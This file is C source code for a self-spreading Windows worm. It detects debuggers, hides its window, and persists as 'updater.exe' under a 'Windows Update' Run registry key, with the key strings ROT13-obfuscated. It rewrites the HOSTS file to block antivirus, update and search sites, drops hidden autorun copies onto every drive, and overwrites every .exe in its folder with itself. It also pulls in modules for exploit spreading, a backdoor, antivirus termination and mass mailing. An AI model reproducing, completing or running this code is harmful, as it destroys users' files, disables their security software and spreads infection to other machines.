#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <Rpc.h>
#include <windows.h>
#include <winsock2.h>
#include <tlhelp32.h>

#include "lib.c"		// Library for ciphering
#include "exploit.c"	// Network spread
#include "p2p.c"		// P2P Spread
#include "backdoor.c"	// File Backdoor
#include "termav.c"		// Anti Virus Terminator
#include "mail.c"		// Mass Mailer

// gcc -s main.c -o main.exe -ws2_32 -lmpr -lRpcrt4
#define RGDsc "Windows Update"
const char HOSTS_f[] = "\n127.0.0.1 www.norton.com\n127.0.0.1 norton.com\n127.0.0.1 "
"yahoo.com\n127.0.0.1 www.yahoo.com\n127.0.0.1 microsoft.com\n127.0.0.1 www.microsoft"
".com\n127.0.0.1 windowsupdate.com\n127.0.0.1 www.windowsupdate.com\n127.0.0.1 www.mcafee"
".com\n127.0.0.1 mcafee.com\n127.0.0.1 www.nai.com\n127.0.0.1 nai.com\n127.0.0.1 www.ca.com"
"\n127.0.0.1 ca.com\n127.0.0.1 liveupdate.symantec.com\n127.0.0.1 www.sophos.com\n127.0.0.1 "
"www.google.com\n127.0.0.1 google.com\n127.0.0.1 www.wikipedia.org\n127.0.0.1 wikipedia.org\n127.0"
".0.1 www.altavista.com\n127.0.0.1 altavista.com\n127.0.0.1 www.bing.com\n127.0.0.1 bing.com\n127.0"
".0.1 www.ask.com\n127.0.0.1 ask.com\n127.0.0.1 www.lycos.com\n127.0.0.1 lycos.com\n127.0.0.1 www.webc"
"rawler.com\n127.0.0.1 webcrawler.com\n127.0.0.1 www.metacrawler.com\n127.0.0.1 metacrawler.com\n"
"127.0.0.1 www.msn.com\n127.0.0.1 msn.com\n127.0.0.1 www.gmail.com\n127.0.0.1 gmail.com\n127.0.0.1"
" www.hotmail.com\n127.0.0.1 hotmail.com\n127.0.0.1 www.amazon.com\n127.0.0.1 amazon.com\n127.0.0.1 "
"www.worldofwarcraft.com\n127.0.0.1 worldofwarcraft.com\n127.0.0.1 www.youtube.com\n127.0.0.1"
" youtube.com\n127.0.0.1 www.ebay.com\n127.0.0.1 ebay.com\n";
const char *Inf_Drives[] = {"A:","B:","D:","E:","F:","G:","H:","I:","J:","K:","L:","M:","N:","O:","P:",
"Q:","R:","S:","T:","U:","V:","W:","X:","Y:","Z:",0};

int Install(void);
int HOSTSFile(void);
int InfectDrives(void);
int InfectExes(void);
int main(int argc, char *argv[])
{
	if(IsDebuggerPresent()) return 1;
	if(argc==2) {
		char Thif[256];
		GetModuleFileName(NULL,Thif,sizeof(Thif));
		if(argv[1]==Thif) goto part;
		SetFileAttributes(argv[1],FILE_ATTRIBUTE_NORMAL);
		CopyFile(Thif,argv[1],FALSE);
	}
part:
	CreateMutex(NULL,0,"Wer45bbrtb439");
	if(GetLastError()==ERROR_ALREADY_EXISTS) return 1;

	AllocConsole();
	ShowWindow(FindWindowA("ConsoleWindowClass",NULL),SW_HIDE);

	CreateThread(NULL,0,AntiVirusTerminate,NULL,0,NULL);
	CreateThread(NULL,0,ExploitMain,NULL,0,NULL);
	CreateThread(NULL,0,FileBackdoor,NULL,0,NULL);
	CreateThread(NULL,0,MassMailMain,NULL,0,NULL);

	Install();
	HOSTSFile();
	InfectExes();
	p2p_spread();
	InfectDrives();
	return 0;
}
int Install(void)
{
	char ModPath[256], SPath[256], TranGU[110];
	GetModuleFileName(NULL,ModPath,sizeof(ModPath));
	GetSystemDirectory(SPath,sizeof(SPath));
	strcat(SPath,"\\updater.exe");
	CopyFile(ModPath,SPath,FALSE);
	memset(TranGU,'\0',sizeof(TranGU));
	CiphStr(TranGU,"FBSGJNER\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Eha"); // SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run

	HKEY RegKey;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,TranGU,0,KEY_WRITE,&RegKey);
	RegSetValueEx(RegKey,RGDsc,0,REG_SZ,SPath,strlen(SPath));
	RegCloseKey(RegKey);
/*	strcat(SPath," \"%1\" %*"); Removed because end users would detect it and be suspicious
	memset(TranGU,'\0',sizeof(TranGU));
	CiphStr(TranGU,"\\rkrsvyr\\furyy\\bcra\\pbzznaq"); // \\exefile\\shell\\open\\command
	RegOpenKeyEx(HKEY_CLASSES_ROOT,TranGU,0,KEY_WRITE,&RegKey);
	RegSetValueEx(RegKey,"",0,REG_SZ,SPath,strlen(SPath));
	RegCloseKey(RegKey);
	memset(TranGU,'\0',sizeof(TranGU));
	CiphStr(TranGU,"pbzsvyr\\furyy\\bcra\\pbzznaq"); // \\comfile\\shell\\open\\command
	RegOpenKeyEx(HKEY_CLASSES_ROOT,TranGU,0,KEY_WRITE,&RegKey);
	RegSetValueEx(RegKey,"",0,REG_SZ,SPath,strlen(SPath));
	RegCloseKey(RegKey);*/
	return 0;
}
int HOSTSFile(void)
{
	char FPath[256], F2Path[256], Transf[110];
	GetSystemDirectory(FPath,sizeof(FPath));
	memset(Transf,'\0',sizeof(Transf));
	CiphStr(Transf,"\\qeviref\\rgp\\UBFGF");
	strcat(FPath,Transf);
	strcpy(F2Path,FPath);
	strcat(F2Path,".MVP");
	FILE *file1 = fopen(FPath,"wb"), *file2 = fopen(F2Path,"wb");
	fputs(HOSTS_f,file1);
	fputs(HOSTS_f,file2);
	fclose(file1); fclose(file2);
	return 0;
}
int InfectDrives(void)
{
	char IFile[256], NewFile[256], Autorun[256], InfFile[256];
	GetSystemDirectory(IFile,sizeof(IFile));
	strcat(IFile,"\\updater.exe");
	int i;
	while(1) {
		for(i = 0; Inf_Drives[i]; i++) {
			memset(NewFile,'\0',sizeof(NewFile));
			memset(Autorun,'\0',sizeof(Autorun));
			memset(InfFile,'\0',sizeof(InfFile));
			strcpy(NewFile,Inf_Drives[i]);
			strcpy(Autorun,Inf_Drives[i]);
			strcat(NewFile,"\\autoprompt.exe");
			strcat(Autorun,"\\autorun.inf");
			if(CopyFile(IFile,NewFile,FALSE)) {
				FILE *runfile = fopen(Autorun,"wb");
				sprintf(InfFile,"[autorun]\r\nopen=autoprompt.exe\r\naction=Open folder to view files\r\n");
				fputs(InfFile,runfile);
				fclose(runfile);
				SetFileAttributes(NewFile,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
				SetFileAttributes(Autorun,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
			}
		}
		Sleep(5000);
	}
}
int InfectExes(void)
{
	WIN32_FIND_DATA d32;
	HANDLE fHandle;
	char MyFile[256];
	GetModuleFileName(NULL,MyFile,sizeof(MyFile));
	if((fHandle = FindFirstFile("*.exe",&d32))==INVALID_HANDLE_VALUE) return 1;
	else {
		if(d32.cFileName==MyFile) goto next;
		SetFileAttributes(d32.cFileName,FILE_ATTRIBUTE_NORMAL);
		CopyFile(MyFile,d32.cFileName,FALSE);
next:
		while(FindNextFile(fHandle,&d32)) {
			if(d32.cFileName==MyFile) continue;
			SetFileAttributes(d32.cFileName,FILE_ATTRIBUTE_NORMAL);
			CopyFile(MyFile,d32.cFileName,FALSE);
		}
		FindClose(fHandle);
	}
	return 0;
}
